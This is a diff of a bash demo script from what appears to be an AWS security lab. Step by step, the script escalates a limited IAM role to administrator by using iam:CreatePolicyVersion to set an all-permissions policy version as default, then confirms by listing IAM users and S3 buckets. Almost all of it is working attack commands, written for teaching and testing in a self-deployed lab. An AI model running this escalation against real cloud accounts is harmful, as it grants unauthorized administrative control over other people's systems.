@@ -1,9 +1,12 @@
 #!/bin/bash
 
-# Demo script for prod_self_privesc_createPolicyVersion module
-# This script demonstrates how to use the self-privilege escalation role
+# Demo script for iam:CreatePolicyVersion privilege escalation
+# This is a ROLE-BASED self-escalation scenario
 
 set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -11,59 +14,85 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
 
-echo -e "${YELLOW}=== Pathfinder-labs Self-Privilege Escalation Demo (CreatePolicyVersion) ===${NC}"
-echo "This demo shows how a role can escalate its own privileges by creating new policy versions"
-echo ""
+# Configuration
+STARTING_USER="pl-prod-cpv-to-admin-starting-user"
+STARTING_ROLE="pl-prod-cpv-to-admin-starting-role"
 
-# Check if AWS CLI is installed
-if ! command -v aws &> /dev/null; then
-    echo -e "${RED}Error: AWS CLI is not installed${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "${GREEN}IAM CreatePolicyVersion Privilege Escalation Demo${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "${YELLOW}Role-Based Self-Escalation${NC}\n"
+
+# Step 1: Get credentials from Terraform output
+echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
+cd ../../../../../..  # Go to project root
+
+# Get the module output
+MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_createpolicyversion.value // empty')
+
+if [ -z "$MODULE_OUTPUT" ]; then
+    echo -e "${RED}Error: Could not find terraform output${NC}"
+    echo "Make sure you've deployed this scenario with: terraform apply"
     exit 1
 fi
 
-# Disable paging for AWS CLI
-export AWS_PAGER=""
+# Extract credentials and policy ARN
+export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
+POLICY_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.policy_arn')
 
-# Role name and ARN (we'll construct the ARN since we can't get it via GetRole)
-ROLE_NAME="pl-prod-self-privesc-createPolicyVersion-role-1"
-ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinder-starting-user-prod --query 'Account' --output text)
-ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ROLE_NAME}"
+if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
+    exit 1
+fi
 
-echo -e "${YELLOW}Step 1: Attempting to assume role${NC}"
+echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}"
+echo "Policy ARN: $POLICY_ARN"
+echo ""
+
+cd - > /dev/null  # Return to scenario directory
+
+# Step 2: Verify identity as user
+echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
+echo "Current identity: $CURRENT_IDENTITY"
+
+if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
+    echo -e "${RED}Error: Not running as expected user${NC}"
+    exit 1
+fi
+echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
+
+# Step 3: Assume the starting role
+echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
 echo "Role ARN: $ROLE_ARN"
 
-# Policy ARN for privilege escalation
-POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/pl-prod-self-privesc-createPolicyVersion-policy"
-echo "Policy ARN: $POLICY_ARN"
+ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
+    --role-arn "$ROLE_ARN" \
+    --role-session-name "cpv-demo-session")
 
-echo ""
-echo -e "${YELLOW}Step 2: Assuming the role${NC}"
-# Assume the role
-ASSUME_ROLE_OUTPUT=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name "self-privesc-demo" --profile pl-pathfinder-starting-user-prod)
+# Update credentials to use assumed role
 export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
 
-echo -e "${GREEN}✓ Successfully assumed role${NC}"
+echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
 
-echo ""
-echo -e "${YELLOW}Step 3: Checking current permissions${NC}"
-# Check what we can do currently
-echo "Current caller identity:"
-aws sts get-caller-identity
-
-echo ""
-echo "Verifying we don't have admin permissions yet..."
-if aws iam list-users --max-items 1 &> /dev/null; then
-    echo -e "${RED}⚠ Unexpectedly have list-users permission already${NC}"
+# Step 4: Test current permissions (should be limited)
+echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
+echo "Attempting to list IAM users (should fail)..."
+if aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied\|not authorized"; then
+    echo -e "${GREEN}✓ Confirmed limited permissions${NC}\n"
 else
-    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
+    echo -e "${YELLOW}⚠ Warning: Unexpected permissions${NC}\n"
 fi
 
+# Step 5: Perform privilege escalation via CreatePolicyVersion
+echo -e "${YELLOW}Step 5: Escalating privileges via iam:CreatePolicyVersion${NC}"
+echo "Creating new policy version with admin permissions..."
 
-echo ""
-echo -e "${YELLOW}Step 4: Creating new policy version with admin permissions (self-privilege escalation)${NC}"
-# Create a new policy version with administrator access
+# Create admin policy document
 cat > /tmp/admin-policy-version.json << EOF
 {
     "Version": "2012-10-17",
@@ -80,50 +109,44 @@ EOF
 echo "New policy version content:"
 cat /tmp/admin-policy-version.json
 
-# Create the new policy version
+# Create new policy version and set as default
 aws iam create-policy-version \
     --policy-arn "$POLICY_ARN" \
     --policy-document file:///tmp/admin-policy-version.json \
     --set-as-default
 
-echo -e "${GREEN}✓ Successfully created new policy version with admin permissions${NC}"
+echo -e "${GREEN}✓ Successfully created new policy version with admin permissions!${NC}\n"
 
+# Wait for policy to propagate
+echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
+sleep 15
 echo ""
-echo -e "${YELLOW}Step 5: Waiting for policy changes to propagate${NC}"
-echo "Waiting 10 seconds for policy changes to propagate..."
-sleep 10
 
-echo ""
-echo -e "${YELLOW}Step 6: Verifying privilege escalation${NC}"
-# Verify the privilege escalation worked by listing IAM users (admin permission)
-echo "Testing admin access by listing IAM users:"
-aws iam list-users --max-items 5
+# Step 6: Verify admin access
+echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
+echo "Testing admin permissions (listing IAM users)..."
+IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
+echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
 
-echo ""
-echo -e "${GREEN}✓ Privilege escalation successful!${NC}"
-echo "The role now has administrator access through the new policy version."
+echo "Testing S3 access..."
+aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
 
-echo ""
-echo -e "${YELLOW}Step 7: Testing elevated permissions${NC}"
-# Test that we now have elevated permissions
-echo "Testing elevated permissions..."
-if aws iam list-users &> /dev/null; then
-    echo -e "${GREEN}✓ Can now list users (admin permission confirmed)${NC}"
-else
-    echo -e "${YELLOW}⚠ Could not list users (permissions may not have propagated yet)${NC}"
-fi
+echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 
-
-# Standardized test results output
-echo "TEST_RESULT:prod_self_privesc_createPolicyVersion:SUCCESS"
-echo "TEST_DETAILS:prod_self_privesc_createPolicyVersion:Successfully escalated privileges using CreatePolicyVersion to create admin policy version"
-echo "TEST_METRICS:prod_self_privesc_createPolicyVersion:policy_version_created=true,admin_access_gained=true"
 # Clean up temp file
 rm -f /tmp/admin-policy-version.json
 
+# Summary
+echo -e "${GREEN}========================================${NC}"
+echo -e "${GREEN}Attack Summary${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
+echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
+echo -e "Step 2: Used ${YELLOW}iam:CreatePolicyVersion${NC} to create admin policy version"
+echo -e "Result: ${GREEN}Administrator Access${NC}"
 echo ""
-echo -e "${GREEN}=== Demo Complete ===${NC}"
-echo "This demonstrates how a role with iam:CreatePolicyVersion on its own policy can escalate its own privileges."
+echo -e "${YELLOW}Attack Path:${NC}"
+echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (CreatePolicyVersion) → Admin"
 echo ""
-echo -e "${YELLOW}To clean up the changes made by this demo, run:${NC}"
-echo "./cleanup_attack.sh"
+echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to remove the malicious policy version${NC}"
+echo ""
